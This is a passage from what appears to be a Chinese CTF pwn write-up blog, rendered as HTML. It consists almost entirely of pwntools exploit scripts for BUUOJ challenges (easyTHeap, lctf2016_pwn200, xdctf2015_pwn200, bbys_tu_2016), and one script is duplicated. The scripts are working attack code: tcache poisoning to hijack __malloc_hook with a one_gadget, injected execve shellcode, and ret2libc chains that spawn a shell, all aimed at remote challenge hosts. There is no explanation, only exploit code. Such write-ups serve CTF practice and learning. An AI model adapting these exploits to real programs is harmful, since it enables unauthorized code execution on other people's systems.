class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[V&amp;N2020 公开赛]easyTHeap&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc/ubuntu18/64/libc-2.27.so&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25597</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[V&amp;N2020 公开赛]easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc/ubuntu18/64/libc-2.27.so&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ubuntu18</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sla(<span class="string">&#x27;size?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sla(<span class="string">&#x27;idx?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">sla(<span class="string">&#x27;idx?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">sla(<span class="string">&#x27;idx?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base - <span class="number">0x250</span>))</span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#3 tcache struct</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base = l64()-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">one = libc_base + <span class="number">0x4f322</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook),<span class="built_in">hex</span>(realloc),<span class="built_in">hex</span>(one)</span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#4</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x48</span>+p64(malloc_hook-<span class="number">0x13</span>))</span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">11</span>+p64(one)+p64(realloc+<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-62-VN2020公开赛-easyTHeap-solve"><a href="#NO-62-VN2020公开赛-easyTHeap-solve" class="headerlink" title="NO.62 VN2020公开赛_easyTHeap_solve"></a>NO.62 VN2020公开赛_easyTHeap_solve</h1><h3 id="exp-62"><a href="#exp-62" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[V&amp;N2020 公开赛]easyTHeap&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc/ubuntu18/64/libc-2.27.so&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25597</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[V&amp;N2020 公开赛]easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc/ubuntu18/64/libc-2.27.so&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ubuntu18</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sla(<span class="string">&#x27;size?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">sla(<span class="string">&#x27;idx?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">sla(<span class="string">&#x27;idx?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">sla(<span class="string">&#x27;idx?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base - <span class="number">0x250</span>))</span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#3 tcache struct</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base = l64()-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">one = libc_base + <span class="number">0x4f322</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook),<span class="built_in">hex</span>(realloc),<span class="built_in">hex</span>(one)</span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment">#4</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x48</span>+p64(malloc_hook-<span class="number">0x13</span>))</span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">11</span>+p64(one)+p64(realloc+<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-63-lctf2016-pwn200-solve"><a href="#NO-63-lctf2016-pwn200-solve" class="headerlink" title="NO.63 lctf2016_pwn200_solve"></a>NO.63 lctf2016_pwn200_solve</h1><h3 id="exp-63"><a href="#exp-63" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./lctf2016_pwn200&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28784</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;lctf2016_pwn200&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;who are u?\n&#x27;</span>,shellcode.ljust(<span class="number">48</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(shellcode.ljust(<span class="number">48</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">ebp = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">shellcode_addr = ebp - <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;give me your id ~~?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;ebp_addr = &quot;</span> + <span class="built_in">hex</span>(ebp)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;shellcode_addr = &quot;</span> + <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(shellcode_addr)</span><br><span class="line">p.send(payload + <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x38</span>-<span class="built_in">len</span>(payload)) + p64(free_got))  <span class="comment">#the juck data must be &#x27;\x00&#x27; in the got!</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-64-xdctf2015-pwn200-solve"><a href="#NO-64-xdctf2015-pwn200-solve" class="headerlink" title="NO.64 xdctf2015_pwn200_solve"></a>NO.64 xdctf2015_pwn200_solve</h1><h3 id="exp-64"><a href="#exp-64" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./xdctf2015_pwn200&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27278</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;xdctf2015_pwn200&#x27;</span>)</span><br><span class="line">_libc = elf.libc</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = </span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = <span class="number">0x0804851C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">sa(<span class="string">&#x27;\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = l32()</span><br><span class="line"></span><br><span class="line"><span class="comment"># process()</span></span><br><span class="line"><span class="comment"># offset = write_addr - _libc.sym[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># system = offset + _libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = offset + next(_libc.search(&#x27;/bin/sh&#x27;))</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;write_addr&#x27;</span>, write_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>, binsh)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(system) + p32(main) + p32(binsh)</span><br><span class="line">sa(<span class="string">&#x27;\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-65-bbys-tu-2016-solve"><a href="#NO-65-bbys-tu-2016-solve" class="headerlink" title="NO.65 bbys_tu_2016_solve"></a>NO.65 bbys_tu_2016_solve</h1><h3 id="exp-65"><a href="#exp-65" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./bbys_tu_2016&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27976</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;bbys_tu_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">printflag = <span class="number">0x0804856D</span></span><br><span class="line">payload = <span 